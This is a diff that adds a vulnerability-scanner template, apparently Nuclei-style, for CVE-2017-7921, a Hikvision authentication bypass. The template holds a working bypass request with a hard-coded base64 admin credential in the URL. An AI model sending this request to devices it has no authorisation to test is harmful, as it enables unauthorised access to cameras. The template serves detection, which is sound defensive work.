@@ -1426,6 +1426,41 @@
       ]
     },
     {
+      "id": "CVE-2017-7921",
+      "info": {
+        "author": "princechaddha",
+        "name": "Hikvision Authentication Bypass",
+        "reference": "https://www.cvedetails.com/cve/CVE-2017-7921/",
+        "severity": "high",
+        "tags": "cve,cve2017,auth-bypass"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<firmwareVersion>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/xml"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/system/deviceInfo?auth=YWRtaW46MTEK"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-9506",
       "info": {
         "author": "pdteam",
